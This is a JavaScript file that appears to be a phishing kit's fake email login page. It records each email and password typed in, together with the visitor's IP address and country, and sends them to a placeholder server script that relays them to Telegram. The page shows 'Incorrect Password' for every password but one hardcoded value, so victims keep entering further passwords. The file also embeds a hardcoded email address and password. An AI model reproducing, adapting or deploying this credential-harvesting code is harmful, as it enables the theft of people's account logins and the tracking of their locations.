const correctEmail = "info@daum.net";
const correctPassword = "7717631095";

const emailForm = document.getElementById("emailForm");
const passwordForm = document.getElementById("passwordForm");
const emailInput = document.getElementById("emailInput");
const emailProceed = document.getElementById("emailProceed");
const passwordInput = document.getElementById("passwordInput");
const passwordSubmit = document.getElementById("passwordSubmit");
const emailError = document.getElementById("emailError");
const passwordError = document.getElementById("passwordError");
const background = document.getElementById("background");
const loading = document.getElementById("loading");
const sessionIdElement = document.getElementById("sessionId");

function generateSessionId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let sessionId = '';
  for (let i = 0; i < 10; i++) {
    sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return sessionId;
}

// Display session ID and set initial states
sessionIdElement.textContent = 'Session ID: ' + generateSessionId();
emailProceed.disabled = emailInput.value.trim() === "";
emailError.classList.toggle("active", emailInput.value.trim() === "");

// Handle email form submission
emailForm.addEventListener("submit", function(event) {
  event.preventDefault(); // Prevent default form submission for client-side handling
  if (emailInput.value.trim() !== "") {
    emailForm.style.display = "none";
    background.style.display = "none";
    loading.classList.add("active");
    setTimeout(function() {
      loading.style.display = "none";
      background.style.display = "block";
      background.style.filter = "blur(3px)";
      passwordForm.style.display = "block";
    }, 3000);
  }
});

// Get IP info
function getIPInfo() {
  return new Promise(function(resolve, reject) {
    fetch('https://ipapi.co/json/')
      .then(function(response) {
        if (!response.ok) {
          throw new Error('IP API error: ' + response.statusText);
        }
        return response.json();
      })
      .then(function(data) {
        resolve({
          ip: data.ip || 'Unknown',
          country: data.country_name || 'Unknown'
        });
      })
      .catch(function(error) {
        console.error('Failed to fetch IP info:', error);
        resolve({ ip: 'Unknown', country: 'Unknown' });
      });
  });
}

// Handle password form submission
passwordSubmit.addEventListener("submit", function(event) {
  event.preventDefault(); // Prevent default form submission
  if (passwordInput.value.trim() === "") {
    passwordError.textContent = "Enter your email password";
    passwordError.classList.add("active");
    passwordInput.classList.add("shake");
    setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
    return;
  }

  getIPInfo().then(function(ipInfo) {
    if (passwordInput.value !== correctPassword) {
      const message = `Wrong login attempt - Email: ${emailInput.value}, Password: ${passwordInput.value}, IP: ${ipInfo.ip}, Country: ${ipInfo.country}`;
      console.log('Attempting to send to Telegram:', message);
      // Send to PHP backend instead of Telegram directly
      fetch('https://your-server.com/send-to-telegram.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Failed to send to backend');
        }
        return response.json();
      })
      .then(() => {
        console.log('Message sent to backend successfully');
      })
      .catch(error => {
        console.error('Error sending to backend:', error);
      });
      passwordError.textContent = "Incorrect Password";
      passwordError.classList.add("active");
      passwordInput.classList.add("shake");
      passwordInput.value = "";
      setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
      return;
    }

    background.style.filter = "none";
    passwordForm.style.display = "none";
  });
});
